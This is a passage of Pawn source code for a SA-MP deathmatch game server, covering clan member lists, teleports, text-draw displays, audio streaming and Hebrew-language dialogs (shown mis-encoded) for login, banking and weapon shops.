	new f[64], putin = -1, k[16];
	format(f,sizeof(f),"/DM/Clans/%s.ini",claninfo[clanid][cname]);
	for(new i = 1; i <= max_clan_members && putin == -1; i++) if(equal(GetProperty_STR(clanprop(clanid,i)),"None")) putin = i;
	if(putin != -1)
	{
		format(k,sizeof(k),"Player%03d",putin);
		fsetstring(f,k,GetName(playerid));
		SetProperty_STR(clanprop(clanid,putin),GetName(playerid));
	}
	return putin;
}
//=[ClanPList_Del]==============================================================
stock ClanPList_Del(clanid,name[])
{
	new f[64], removefrom = -1, k[16];
	format(f,sizeof(f),"/DM/Clans/%s.ini",claninfo[clanid][cname]);
	for(new i = 1; i <= max_clan_members && removefrom == -1; i++) if(equal(GetProperty_STR(clanprop(clanid,i)),name)) removefrom = i;
	if(removefrom != -1)
	{
		format(k,sizeof(k),"Player%03d",removefrom);
		fsetstring(f,k,"None");
		SetProperty_STR(clanprop(clanid,removefrom),"None");
	}
	return removefrom;
}
//=[ClanPList_RenameP]==========================================================
stock ClanPList_RenameP(clanid,oldname[],newname[])
{
	new f[64], renamein = -1, k[16];
	format(f,sizeof(f),"/DM/Clans/%s.ini",claninfo[clanid][cname]);
	for(new i = 1; i <= max_clan_members && renamein == -1; i++) if(equal(GetProperty_STR(clanprop(clanid,i)),oldname)) renamein = i;
	if(renamein != -1)
	{
		format(k,sizeof(k),"Player%03d",renamein);
		fsetstring(f,k,newname);
		SetProperty_STR(clanprop(clanid,renamein),newname);
	}
	return renamein;
}
//=[ClanPList_RenameC]==========================================================
stock ClanPList_RenameC(clanid,oldname[])
{
	new f[64], pr[32];
	format(f,sizeof(f),"/DM/Clans/%s.ini",claninfo[clanid][cname]);
	for(new i = 1; i <= max_clan_members; i++)
	{
		format(pr,sizeof(pr),"clan%s%d-%d",oldname,clanid,i);
		SetProperty_STR(clanprop(clanid,i),GetProperty_STR(pr));
		RemoveProperty_STR(pr);
	}
	return 1;
}
//=[ClanPList_Count]============================================================
stock ClanPList_Count(clanid)
{
	new c = 0;
	for(new i = 1; i <= max_clan_members; i++) if(!equal(GetProperty_STR(clanprop(clanid,i)),"None")) c++;
	return c;
}
//=[ClanPList_Player]===========================================================
stock ClanPList_Player(clanid,index)
{
	new n[64];
	format(n,sizeof(n),GetProperty_STR(clanprop(clanid,index)));
	return n;
}
//=[ClanPList_Index]============================================================
stock ClanPList_Index(clanid,player[])
{
	new idx = -1;
	for(new i = 1; i <= max_clan_members && idx == -1; i++) if(equal(GetProperty_STR(clanprop(clanid,i)),player)) idx = i;
	return idx;
}
//=[ClanPList_Update]===========================================================
stock ClanPList_Update(clanid)
{
	new f[64], k[16];
	format(f,sizeof(f),"/DM/Clans/%s.ini",claninfo[clanid][cname]);
	for(new i = 1; i <= max_clan_members; i++)
	{
		format(k,sizeof(k),"Player%03d",i);
		fsetstring(f,k,GetProperty_STR(clanprop(clanid,i)));
	}
}
//=[ClanPList_Remove]===========================================================
stock ClanPList_Remove(clanid) for(new i = 1; i <= max_clan_members; i++) RemoveProperty_STR(clanprop(clanid,i));
//=[ClanPList_Reorder]==========================================================
stock ClanPList_Reorder(clanid)
{
	new f[64], k[16], cur[MAX_PLAYER_NAME], clanpnames[max_clan_members][MAX_PLAYER_NAME], count = 0;
	format(f,sizeof(f),"/DM/Clans/%s.ini",claninfo[clanid][cname]);
	for(new i = 1, bool:flag = false; i <= max_clan_members; i++)
	{
		format(cur,sizeof(cur),GetProperty_STR(clanprop(clanid,i)));
		if(equal(cur,"None") || !strlen(cur)) continue;
		flag = false;
		for(new j = 0; j < count && !flag; j++) if(equal(clanpnames[j],cur)) flag = true;
		if(!flag) format(clanpnames[count++],MAX_PLAYER_NAME,cur);
	}
	for(new i = 1; i <= max_clan_members; i++)
	{
		format(k,sizeof(k),"Player%03d",i);
		if(i <= count)
		{
			SetProperty_STR(clanprop(clanid,i),clanpnames[i-1]);
			fsetstring(f,k,clanpnames[i-1]);
		}
		else
		{
			SetProperty_STR(clanprop(clanid,i),"None");
			fsetstring(f,k,"None");
		}
	}
}
//=[firstchars]=================================================================
stock firstchars(const source[], len=1)
{   // by Y_Less, improved by me
	new ret[M_S];
	strmid(ret,source,0,len);
	return ret;
}
//=[lastchars]==================================================================
stock lastchars(source[],len)
{   // by Y_Less, improved by me
	new ret[M_S], srclen = strlen(source);
	strmid(ret,source,srclen - len,srclen,M_S);
	return ret;
}
//=[DropSPW]====================================================================
stock DropSPW(playerid)
{
	if(spAmmunation[playerinfo[playerid][spweapon]][spaWeapon] > 0)
	{
		DefineSPWGun(playerid,playerinfo[playerid][spweapon],0);
		if(GetPlayerWeapon(playerid) == spAmmunation[playerinfo[playerid][spweapon]][spaWeapon]) SetPlayerArmedWeapon(playerid,0);
		DefineSPWObject(playerid,playerinfo[playerid][spweapon],0);
	}
	if(playerinfo[playerid][logged] && spAmmunation[playerinfo[playerid][spweapon]][spaSaved]) fsetint(fuser(playerid),"SpecialWeapon",spw_none);
	playerinfo[playerid][spweapon] = spw_none, playerinfo[playerid][spwammo] = 0;
	return 1;
}
//=[IsPlayerDead]===============================================================
stock IsPlayerDead(playerid)
{
	new Float:h;
	GetPlayerHealth(playerid,h);
	return (h <= 0.0 || GetPlayerState(playerid) == PLAYER_STATE_WASTED);
}
//=[PlaySound]==================================================================
stock PlaySound(playerid,soundid,Float:x=0.0,Float:y=0.0,Float:z=0.0) return playerinfo[playerid][setting][setting_sounds] && !IsPlayerAFK_(playerid) ? PlayerPlaySound(playerid,soundid,x,y,z) : 1;
//=[CountOfSRaceTypeInArray]====================================================
stock CountOfSRaceTypeInArray(arr,type)
{
	new c = 0;
	#define syncsrace(%1) if(arr == %1) for(new i = 0; i < sizeof(SRacePositions_%1); i++) if(SRacePositions_%1[i][srType] == type) c++
	syncsrace(1);
	syncsrace(2);
	syncsrace(3);
	syncsrace(4);
	#undef syncsrace
	return c;
}
//=[HasClanPermission]==========================================================
stock HasClanPermission(playerid,perm,dia=0)
{
	if(playerinfo[playerid][lclan] < claninfo[playerinfo[playerid][clan]][cperms][perm])
	{
		new string[256];
		if(perm == clanperm_deposit || perm == clanperm_withdraw)
		{
		    format(string, sizeof(string), " .Єь юЁ· ьсЎЄ ЇЄхьф цх Єьщъ ьфщх· с°ю· ўьря %d", claninfo[playerinfo[playerid][clan]][cperms][perm]);
		    SendClientMessage(playerid, red, string);
		}
		else
		{
		    format(string,sizeof(string),".рщя ьъ тщ∙ф ьсщЎхЄ фЇЄхьф фцх\n\nфтщ∙ф фу°х∙ф: " @c(lightred) "%s" @c(red) "\nфЇЄхьф ух°∙· °ю· тщ∙х· сўьря: " @c(lightred) "%d" @c(red) "\nх°ю· фтщ∙х· ∙ьъ фщр: " @c(lightred) "%d",ClanPermissions[perm][clpName],claninfo[playerinfo[playerid][clan]][cperms][perm],playerinfo[playerid][lclan]);
		    ClanDialog(playerid,clan_err,string,dia);
		}
		return 0;
	}
	return 1;
}
//=[ChoosenWeapon]==============================================================
stock ChoosenWeapon(playerid,weaponid) return weaponid < max_wtypes ? playerinfo[playerid][wtype][weaponid] : weaponid;
//=[TeleportToWarArea]==========================================================
stock TeleportToWarArea(playerid,areaid,pos=-1)
{
	new rnd = -1, Float:x = 0.0, Float:y = 0.0;
	#define warareasync(%1) else if(areaid == %1) rnd = (pos == -1 ? random(sizeof(WarPositions_%1)) : pos), SetPlayerPos(playerid,WarPositions_%1[rnd][0],WarPositions_%1[rnd][1],WarPositions_%1[rnd][2]), SetPlayerFacingAngle(playerid,WarPositions_%1[rnd][3]), x = WarPositions_%1[rnd][0], y = WarPositions_%1[rnd][1]
	if(areaid < 1 || areaid > sizeof(WarInteriors)) return 1;
	warareasync(1);
	warareasync(2);
	warareasync(3);
	warareasync(4);
	warareasync(5);
	warareasync(6);
	warareasync(7);
	warareasync(8);
	warareasync(9);
	warareasync(10);
	warareasync(11);
	warareasync(12);
	warareasync(13);
	#undef warareasync
	if(!WarInteriors[areaid-1])
	{
		new Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		SetPlayerWorldBounds(playerid,x+200.0,x-200.0,y+200.0,y-200.0);
	}
	SetPlayerInterior(playerid,WarInteriors[areaid-1]);
	SetPlayerVirtualWorld(playerid,world_war);
	return 1;
}
//=[GetMaxAreaPositions]========================================================
stock GetMaxAreaPositions(areaid)
{
	#define warareasync(%1) else if(areaid == %1) return sizeof(WarPositions_%1)
	if(areaid < 1 || areaid > sizeof(WarInteriors)) return 1;
	warareasync(1);
	warareasync(2);
	warareasync(3);
	warareasync(4);
	warareasync(5);
	warareasync(6);
	warareasync(7);
	warareasync(8);
	warareasync(9);
	warareasync(10);
	warareasync(11);
	warareasync(12);
	warareasync(13);
	#undef warareasync
	return -1;
}
//=[TeleportPlayerToTeamActivity]===============================================
stock TeleportPlayerToTeamActivity(playerid,areaid)
{
	new rnd = -1;
	#define taareasync(%1) else if(areaid == %1) rnd = random(sizeof(WarPositions_%1)), SetPlayerPos(playerid,TeamActivityPositions_%1[rnd][0],TeamActivityPositions_%1[rnd][1],TeamActivityPositions_%1[rnd][2]), SetPlayerFacingAngle(playerid,TeamActivityPositions_%1[rnd][3])
	if(areaid < 1 || areaid > sizeof(TeamActivityInteriors)) return 1;
	taareasync(1);
	taareasync(2);
	taareasync(3);
	taareasync(4);
	taareasync(5);
	taareasync(6);
	taareasync(7);
	taareasync(8);
	#undef taareasync
	SetPlayerInterior(playerid,TeamActivityInteriors[areaid-1]);
	SetPlayerVirtualWorld(playerid,worlds_teamact+(areaid % 2 == 0 ? (areaid/2) : ((areaid/2)+1)));
	return 1;
}
//=[GetMaxTeamActivityPositions]================================================
stock GetMaxTeamActivityPositions(areaid)
{
	#define taareasync(%1) else if(areaid == %1) return sizeof(TeamActivityPositions_%1)
	if(areaid < 1 || areaid > sizeof(TeamActivityInteriors)) return 1;
	taareasync(1);
	taareasync(2);
	taareasync(3);
	taareasync(4);
	taareasync(5);
	taareasync(6);
	taareasync(7);
	taareasync(8);
	#undef taareasync
	return -1;
}
//=[ShowTXD]====================================================================
stock ShowTXD(playerid,txd,act)
{
	if(act == 's')
	{
		TextDrawShowForPlayer(playerid,TXD[txd]);
		playerinfo[playerid][showingtxd][txd] = 1;
	}
	else if(act == 'h')
	{
		TextDrawHideForPlayer(playerid,TXD[txd]);
		playerinfo[playerid][showingtxd][txd] = 0;
	}
	return 1;
}
//=[HPText]=====================================================================
stock HPText(playerid,Float:amount,text[]="")
{
	if(!playerinfo[playerid][spawned] || playerinfo[playerid][reqclass] || floatround(amount) == playerinfo[playerid][lasthptext][0]) return 1;
	playerinfo[playerid][lasthptext][0] = floatround(amount), playerinfo[playerid][lasthptext][1] = 3;
	new PlayerText:td, str[32];
	if(amount == 999.0) format(str,sizeof(str),text);
	else if(amount == 0.0) return 1;
	else if(amount > 0.0 && amount < 1.0) format(str,sizeof(str),"~%c~%.1f",amount > 0.0 ? 'g' : 'r',amount);
	else if(amount > 100.0) format(str,sizeof(str),"~g~100+");
	else format(str,sizeof(str),"~%c~%.0f",amount > 0.0 ? 'g' : 'r',amount);
	td = CreatePlayerTextDraw(playerid,146.000000,372.000000,str);
	PlayerTextDrawBackgroundColor(playerid,td,255);
	PlayerTextDrawFont(playerid,td,1);
	PlayerTextDrawLetterSize(playerid,td,0.480000,1.400000);
	PlayerTextDrawColor(playerid,td,amount > 0.0 ? green : red);
	PlayerTextDrawSetOutline(playerid,td,1);
	PlayerTextDrawSetProportional(playerid,td,1);
	ShowTempTextDraw(playerid,2000,temptext_hp,td,1);
	return 1;
}
//=[IsPlayerInHQ]===============================================================
stock IsPlayerInHQ(playerid) return (GetPlayerHQ(playerid) > 0 && (!playerinfo[playerid][clan] || (playerinfo[playerid][clan] != 0 && GetPlayerHQ(playerid) != playerinfo[playerid][clan])));
//=[TTS]========================================================================
stock TTS(playerid,text[])
{
	new addr[256];
	format(addr,sizeof(addr),"http://translate.google.com/translate_tts?tl=en&q=%s",text);
	return PlayAudioStreamForPlayer(playerid,addr);
}
//=[HQRulingTimer]==============================================================
stock HQRulingTimer(clanid,act)
{
	new string[64];
	switch(act)
	{
		case 's':
		{
			format(string,sizeof(string),"~b~~h~~h~%s vs. %s~n~%02d:00",claninfo[clanid][cname],claninfo[claninfo[clanid][cruling][0]][cname],claninfo[clanid][cruling][1]/60);
			claninfo[clanid][crulingtext] = TextDrawCreate(488.000000,411.000000,string);
			TextDrawAlignment(claninfo[clanid][crulingtext],2);
			TextDrawBackgroundColor(claninfo[clanid][crulingtext],-1);
			TextDrawFont(claninfo[clanid][crulingtext],1);
			TextDrawLetterSize(claninfo[clanid][crulingtext],0.500000,1.700000);
			TextDrawColor(claninfo[clanid][crulingtext],-1);
			TextDrawSetOutline(claninfo[clanid][crulingtext],0);
			TextDrawSetProportional(claninfo[clanid][crulingtext],1);
			TextDrawSetShadow(claninfo[clanid][crulingtext],1);
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && (playerinfo[i][clan] == clanid || playerinfo[i][clan] == claninfo[clanid][cruling][0])) TextDrawShowForPlayer(i,claninfo[clanid][crulingtext]);
		}
		case 'd':
		{
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && (playerinfo[i][clan] == clanid || playerinfo[i][clan] == claninfo[clanid][cruling][0])) TextDrawHideForPlayer(i,claninfo[clanid][crulingtext]);
			TextDrawDestroy(claninfo[clanid][crulingtext]);
		}
		case 'u':
		{
			format(string,sizeof(string),"~b~~h~~h~%s vs. %s~n~%02d:%02d",claninfo[clanid][cname],claninfo[claninfo[clanid][cruling][0]][cname],claninfo[clanid][cruling][1]/60,claninfo[clanid][cruling][1]%60);
			TextDrawSetString(claninfo[clanid][crulingtext],string);
		}
	}
}
//=[ShowBoomText]===============================================================
/*stock ShowBoomText(playerid)
{
	if(playerinfo[playerid][boomtimer] != -1) return 1;
	playerinfo[playerid][boomtd][0] = TextDrawCreate(536.0,314.0,"LD_NONE:explm01");
	TextDrawFont(playerinfo[playerid][boomtd][0],4);
	TextDrawColor(playerinfo[playerid][boomtd][0],0xFFFFFFFF);
	TextDrawTextSize(playerinfo[playerid][boomtd][0],140,140);
	TextDrawShowForPlayer(playerid,playerinfo[playerid][boomtd][0]);
	playerinfo[playerid][boomtd][1] = TextDrawCreate(536.0,314.0,Text);
	TextDrawAlignment(playerinfo[playerid][boomtd][1],2);
	TextDrawBackgroundColor(playerinfo[playerid][boomtd][1],0xF1FE01FF);
	TextDrawFont(playerinfo[playerid][boomtd][1],0);
	TextDrawLetterSize(playerinfo[playerid][boomtd][1],1.11,3.3);
	TextDrawColor(playerinfo[playerid][boomtd][1],0x00000000);
	TextDrawSetOutline(playerinfo[playerid][boomtd][1],0);
	TextDrawSetProportional(playerinfo[playerid][boomtd][1],1);
	TextDrawSetShadow(playerinfo[playerid][boomtd][1],1);
	SetTimerEx("BoomText",75,0,"ii",playerid,1);
}*/
//=[IsFlyingInTooHighHeli]======================================================
stock IsFlyingInTooHighHeli(playerid)
{
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return 0;
	new Float:p[2], v = GetPlayerVehicleID(playerid);
	GetVehiclePos(v,p[0],p[0],p[1]);
	return IsHeli(v) && p[1] > 175.0;
}
//=[PlayFromYouTube]============================================================
forward PlayFromYouTube(playerid,response_code,data[]);
public PlayFromYouTube(playerid,response_code,data[])
{
	if(response_code == 200)
	{
		new string[M_S], hpos = strfind(data,"\"h\"");
		strmid(string,data,11,strlen(data));
		strdel(string,strfind(string,"\""),strlen(string));
		SendClientMessage(playerid,lightblue," ~~~ :YouTube ю∙ющЄ ыЄ· ю·хъ ~~~");
		SendClientMessage(playerid,white,string);
		strmid(string,data,hpos+7,hpos+39);
		format(string,sizeof(string),"http://www.youtube-mp3.org/get?video_id=%s&h=%s",playerinfo[playerid][youtube],string);
		SendClientMessage(playerid,white,string);
		PlayAudioStreamForPlayer(playerid,string);
		playerinfo[playerid][music] = 1;
  	}
  	else SendClientMessage(playerid,red," .фўщ∙х° ∙фўьу· ьр ЇЄщь");
  	return 1;
}
//=[ToggleWaterWalk]============================================================
stock ToggleWaterWalk(playerid,on)
{
	if(on == playerinfo[playerid][waterwalk][0]) return 1;
	playerinfo[playerid][waterwalk][0] = on;
	if(on) playerinfo[playerid][waterwalk][1] = CreateSObject(1649,0.0,0.0,-5.0,450.24078,0.0,0.0);
	else DestroySObject(playerinfo[playerid][waterwalk][1]);
	return 1;
}
//=[AddPerPlayer3DTextLabel]====================================================
stock AddPerPlayer3DTextLabel(type,Float:x,Float:y,Float:z,Float:drawdistance,world=world_normal)
{
	new id = -1;
	for(new i = 0; i < MAX_PPT && id == -1; i++) if(!pptinfo[i][pptValid]) id = i;
	pptinfo[id][pptValid] = 1;
	pptinfo[id][pptType] = type;
	pptinfo[id][pptPos][0] = x;
	pptinfo[id][pptPos][1] = y;
	pptinfo[id][pptPos][2] = z;
	pptinfo[id][pptDrawDistance] = drawdistance;
	pptinfo[id][pptVirtualWorld] = world;
	pptinfo[id][pptText][0] = EOS;
	return id;
}
//=[SetPerPlayer3DTextLabel]====================================================
stock SetPerPlayer3DTextLabel(playerid,pptype,text[])
{
	for(new i = 0; i < ppt_count; i++) if(pptinfo[i][pptValid] && pptinfo[i][pptType] == pptype && playerinfo[playerid][ppts][i] != (PlayerText3D:1024)) format(pptinfo[i][pptText],100,text);
	return 1;
}
//=[ShowPlayerConstDialog]======================================================
stock ShowPlayerConstDialog(playerid,dialogid,param=0)
{
	new string[300];
	switch(dialogid)
	{
		case dialog_register:
		{
			#pragma tabsize 0
			DialogCreate(2);
			DialogString("\t\t" @c(green) "!" @c(lightgreen) comname " DeathMatch" @c(green) " с°хыщэ фсрщэ ь∙°·");
			DialogString("\n" @c(lightred) webpage @c(orange) " ф∙°· ∙щщъ ьр·°");
			DialogString("\n" @c(yellow) ".рЁчЁх юцющЁщэ рх·ъ ьф°∙э ь∙°· хьфЁх· юютххя рЇ∙°хщх·");
			DialogString(".ыь юф ∙ю°ххщчщэ щщ∙ю° рхшхюшщ· рэ °∙хющэ ь∙°·");
			DialogString(@c(red) "  * !ьр чхсф ьф°∙э рсь юрху юхюьї");
			DialogString("\n" @h(6A6AFF) ":ыущ ьф°∙э ь∙°· Єьщъ ьфўьщу ёщёюр ∙·∙ю∙ рх·ъ сЄ·щу");
			DialogSend(playerid,dialog_register,DIALOG_STYLE_INPUT,@c(lightblue) "ф°∙юф ь∙°·","ф°∙э","ётх°");
			#pragma tabsize 4
		}
		case dialog_login:
		{
			#pragma tabsize 0
			DialogCreate(2);
			DialogString("\t\t" @c(green) "!" @c(lightgreen) comname " DeathMatch" @c(green) " с°хыщэ фсрщэ ь∙°·");
			DialogString("\n" @c(lightred) webpage @c(orange) " ф∙°· ∙щщъ ьр·°");
			DialogString("\n" @c(yellow) ".юыщххя ∙фыщЁхщ ∙ьъ °∙хэ, Єьщъ ьф·чс° ью∙·ю∙ ∙ьъ");
			DialogString("\n" @h(6A6AFF) ":ыущ ьф·чс° Єьщъ ьфўьщу р· фёщёюр ∙ь фю∙·ю∙ ∙ьъ");
			DialogString("(сч° с\"·Ўхтф\" ыущ ьЎЇх· рх ьфё·щ° р· юф ∙р·ф юўьщу)");
			DialogSend(playerid,dialog_login,playerinfo[playerid][logindia],@c(lightblue) "ф·чс°х· ь∙°·","ф·чс°","·Ўхтф");
			#pragma tabsize 4
		}
		case dialog_secretword:
		{
			#pragma tabsize 0
			DialogCreate(2);
            switch(param)
			{
				case 1: DialogString(@c(red) ":с·х° ю∙·ю∙ чу∙ с∙°·, Єьщъ ьсчх° ющьф ёхущ·");
				case 2: DialogString(@c(red) ":∙щэ ьс - ∙°· щ∙ юЄ°ы· чу∙ф, фющьф фёхущ·, ∙юхЁЄ· Ї°щЎх· ью∙·ю∙щэ");
				case 3: DialogString(@c(red) ":чхсф Єь ыь ∙чўя ьфыЁщё ющьф ёхущ· хьцых° рх·ф");
				case 4: DialogString(@c(red) ":фющьф фёхущ· чщщс· ьфщх· ьЇчх· 4 ·хщэ Єу юўёщюхэ 30 ·хщэ");
				case 5: DialogString(@c(red) ":Ёр ьфыЁщё р· фющьф фёхущ· фчу∙ф ∙р·ф °хЎф");
				case 6: DialogString(@c(red) ":фющьф фёхущ· ∙ьъ ьр щыхьф ьфщх· фёщёюр ∙ьъ");
			}
            DialogString(@c(white) ",фющьф фёхущ· фщр ющьф ∙··°хэ ьрсшч· фю∙·ю∙ ∙ьъ Ёту Ї°щЎх·");
            DialogString(".сюў°ф ∙ф∙°· цщфф ∙ющ∙фх ф·чс° ью∙·ю∙ ∙ьъ ююч∙с рч°, фхр щЎш°ъ ьфўьщу р· фющьф фёхущ· ыущ ь∙чў");
            DialogString("!" @c(darkred) "ч∙хс: " @c(white) "рщя ь·· р· фющьф фёхущ· ьрє рчу, тэ ьр ьрующЁщэ хьфЁфьф");
            DialogString(".Єьщъ ьцых° р· фющьф фёхущ· ∙ьъ хь∙юх° рх·ф °ў рЎьъ");
            DialogString(".сЁхёє, °Ўхщ юрху ьфтущ° ющьф ∙фщр ьр ЁЇхЎф юущ рх ўьф ьЁщчх∙");
            DialogSend(playerid,dialog_secretword,DIALOG_STYLE_INPUT,@c(lightblue) "ющьф ёхущ·","∙юх°","");
			#pragma tabsize 4
		}
		case dialog_bank:
		{
			format(string,sizeof(string),@c(green) "ыюх· фыёє сч∙схя фсЁў ∙ьъ: " @c(lightgreen) "$%d",playerinfo[playerid][bank]);
			if(!levels[playerinfo[playerid][level]][BankLimit]) format(string,sizeof(string),"%s\n" @c(green) "ютсь· ч∙схя фсЁў ∙ьъ: " @c(lightgreen) "рщя ютсьф",string);
			else format(string,sizeof(string),"%s\n" @c(green) "ютсь· ч∙схя фсЁў ∙ьъ: " @c(lightgreen) "$%d",string,levels[playerinfo[playerid][level]][BankLimit]);
			if(playerinfo[playerid][ccard]) format(string,sizeof(string),"%s\nфЇўу ыёє\nфхЎр ыёє\nфЇўу р· ыь фыёє сщуъ\nфхЎр р· ыь фыёє юфсЁў\nюыщ°· ы°шщё р∙°рщ\nфту°х· фсЁў ∙ьъ",string);
			else format(string,sizeof(string),"%s\nфЇўу ыёє\nфхЎр ыёє\nфЇўу р· ыь фыёє сщуъ\nфхЎр р· ыь фыёє юфсЁў\nўЁщщ· ы°шщё р∙°рщ\nфту°х· фсЁў ∙ьъ",string);
			if(playerinfo[playerid][clan]) strcat(string, @c(red) "\nсЁў фўьря");
			format(string,sizeof(string),"%s\n" @c(lightred) "хсч° ∙чўя ь°∙щю· ЇЄхьх· ЁхёЇх· Tab ьчї",string);
			ShowPlayerDialog(playerid,dialog_bank,DIALOG_STYLE_LIST,@c(lightblue) "рЇ∙°хщх· юЄ°ы· фсЁў",string,"сч°","ётх°");
		}
		case dialog_cbank:
		{
		    new maxstr[500];
			format(string, sizeof(string), @c(red)"ыюх· фыёє ссЁў фўьря: "@c(lightred)"$%d\n", claninfo[playerinfo[playerid][clan]][cbank]);
			strcat(maxstr, string);
			format(string, sizeof(string), @c(red)"ютсь· фыёє ссЁў фўьря: "@c(lightred)"$%d\n", claninfo[playerinfo[playerid][clan]][cmaxbank]);
			strcat(maxstr, string);
			strcat(maxstr, @c(grey)"фЇўу ыёє\n"@c(grey)"фхЎр ыёє\n"@c(grey)"фЇўу р· ыь фыёє сщуъ\n"@c(grey)"фхЎр р· ыь фыёє юфсЁў");
			ShowPlayerDialog(playerid,dialog_cbank,DIALOG_STYLE_LIST,@c(red) "сЁў фўьря", maxstr,"сч°","чцх°");
		}
		case dialog_cbank_deposit: ShowPlayerDialog(playerid,dialog_cbank_deposit,DIALOG_STYLE_INPUT,@c(grey) "сЁў фўьря", "рЁр °∙хэ р· ёыхэ фыёє ∙рх·х ·°Ўф ьфЇўщу","фЇўу","чцх°");
		case dialog_cbank_withdraw: ShowPlayerDialog(playerid,dialog_cbank_withdraw,DIALOG_STYLE_INPUT,@c(grey) "сЁў фўьря", "рЁр °∙хэ р· ёыхэ фыёє рх·х ·°Ўф ью∙хъ","ю∙хъ","чцх°");
		case dialog_banksetting:
		{
			format(string,sizeof(string),@c(white)"∙щ·хє фч∙схя Єэ ∙чўЁщэ рч°щэ - {%s}%s\n"@c(white)"Є°щы· ёщёю· ч∙схя фсЁў",HexStringOfColor(playerinfo[playerid][bankshare] ? green : red),playerinfo[playerid][bankshare] ? ("ЇЄщь") : ("ысхщ"));
			ShowPlayerDialog(playerid,dialog_banksetting,DIALOG_STYLE_LIST,@c(lightblue) "фту°х· ч∙схя фсЁў ∙ьъ","∙щ·хє ч∙схЁх· сЁўщэ Єэ рч°щэ\nЄ°щы· ёщёю· ч∙схя фсЁў","сч°","чцх°");
		}
		case dialog_tm:
		{
			new dia[M_S_D*2];
			/*for(new i = 0; i < sizeof(Teleports); i++)
			{
				strmid(string,Teleports[i][Tcmd],1,strlen(Teleports[i][Tcmd]));
				format(string,sizeof(string),"%s%s\t\t" @c(lightyellow) "Level: " @c(yellow) "%02d" @c(lightyellow) "\tRating: " @c(yellow) "%.2f",string,strs(" ",15-strlen(string)),Teleports[i][Tl],floatdiv(Teleports[i][Trate],Teleports[i][Trates] < 1 ? 1 : Teleports[i][Trates]));
				format(dia,sizeof(dia),!i ? ("%s%s") : ("%s\n%s"),dia,string);
			}*/
			format(dia,sizeof(dia),"Command\tLevel\tRating");
			for(new i = 0; i < sizeof(Teleports); i++)
			{
				strmid(string,Teleports[i][Tcmd],1,strlen(Teleports[i][Tcmd]));
				format(string,sizeof(string),@c(yellow) "%s\t" @c(lightyellow) "%02d\t%.2f",string,Teleports[i][Tl],floatdiv(Teleports[i][Trate],Teleports[i][Trates] < 1 ? 1 : Teleports[i][Trates]));
				format(dia,sizeof(dia),"%s\n%s",dia,string);
			}
			ShowPlayerDialog(playerid,dialog_tm,DIALOG_STYLE_TABLIST_HEADERS,@c(lightblue) "°∙щю· ф∙щтх°щэ фюьрф",dia,"ф∙·т°","чцх°");
		}
		case dialog_ammu:
		{
			if(ammusale[0] > ammusale_none) ShowPlayerDialog(playerid,dialog_ammu,DIALOG_STYLE_LIST,@c(lightblue) "чЁх· фЁ∙ўщэ","·Ї°щш Ё∙ўщэ - ўЁщщф °тщьф\n·Ї°щш Ё∙ўщэ - ы°шщё р∙°рщ\n·Ї°щш ·хёЇщэ\nЁ∙ўщэ ющхчущэ\n"@c(lightred) "юсЎЄ ющхчу!" @c(white) " - ьчї ьЇ°шщэ\nрщЇхё Ё∙ўщэ","сч°","ётх°");
			else ShowPlayerDialog(playerid,dialog_ammu,DIALOG_STYLE_LIST,@c(lightblue) "чЁх· фЁ∙ўщэ","·Ї°щш Ё∙ўщэ - ўЁщщф °тщьф\n·Ї°щш Ё∙ўщэ - ы°шщё р∙°рщ\n·Ї°щш ·хёЇщэ\nЁ∙ўщэ ющхчущэ\nюсЎЄщэ\nрщЇхё Ё∙ўщэ","сч°","ётх°");
		}
		case dialog_bw:
		{
			new wmenu[M_S_D], lvl[16];
			for(new i = 0; i < sizeof(Ammunation); i++)
			{
				valstr(lvl,Ammunation[i][aLevel]);
				format(wmenu,sizeof(wmenu),"%s%s%s%s%s" @c(yellow) "Level: " @c(lightyellow) "%d\t" @c(green) "$%d" @c(white),wmenu,!strlen(wmenu) ? ("") : ("\n"),GetWeaponAmmunationColor(Ammunation[i][aSlot]),Ammunation[i][aName],strs("\t",(4-(strlen(Ammunation[i][aName])/6))+Ammunation[i][aAddTab]),Ammunation[i][aLevel],WeaponCost(playerid,i));
			}
			if(playerinfo[playerid][clickon] == 1) ShowPlayerDialog(playerid,dialog_bw,DIALOG_STYLE_LIST,@c(lightblue) "чЁх· фЁ∙ўщэ -> ўЁщщф",wmenu,"ўЁф","сщшхь");
			else if(playerinfo[playerid][clickon] == 2) ShowPlayerDialog(playerid,dialog_bw,DIALOG_STYLE_LIST,@c(lightblue) "чЁх· фЁ∙ўщэ -> ўЁщщф сы°шщё р∙°рщ",wmenu,"ўЁф","сщшхь");
		}
		case dialog_mode: ShowPlayerDialog(playerid,dialog_mode,DIALOG_STYLE_INPUT,@c(lightblue) "Mode",modehelpdialog,"счщ°ф","щЎщрф");
		case dialog_code2: ShowPlayerDialog(playerid,dialog_code2,DIALOG_STYLE_LIST,@c(lightblue) "ўху",@c(green) "∙щюх∙ сўху\n" @c(yellow) "фЄс°· фўху ь∙чўя рч°\n" @c(red) "ючщў· фўху","счщ°ф","");
		case dialog_places2: ShowPlayerDialog(playerid,dialog_places2,DIALOG_STYLE_LIST,@c(lightblue) "юўхюх·","ющуЄ Єь фюўхэ\nёщюхя сюЇф\nфё° ёщюхя сюЇф","счщ°ф","чцх°");
		case dialog_admintotal:
		{
			new line[128], dia[1024];
			for(new i = 0; i < sizeof(AdminAbilities); i++)
			{
				format(line,sizeof(line),@c(grey) "(%d) {%s}%s",AdminAbilities[i][aaLevel],HexStringOfColor(i % 2 == 0 ? white : lightyellow),AdminAbilities[i][aaName]);
				format(dia,sizeof(dia),!strlen(dia) ? ("%s%s") : ("%s\n%s"),dia,line);
			}
			ShowPlayerDialog(playerid,dialog_admintotal,DIALOG_STYLE_LIST,@c(lightblue) "рЇ∙°хщх· ыхььх·",dia,"сщЎхЄ","сщшхь");
		}
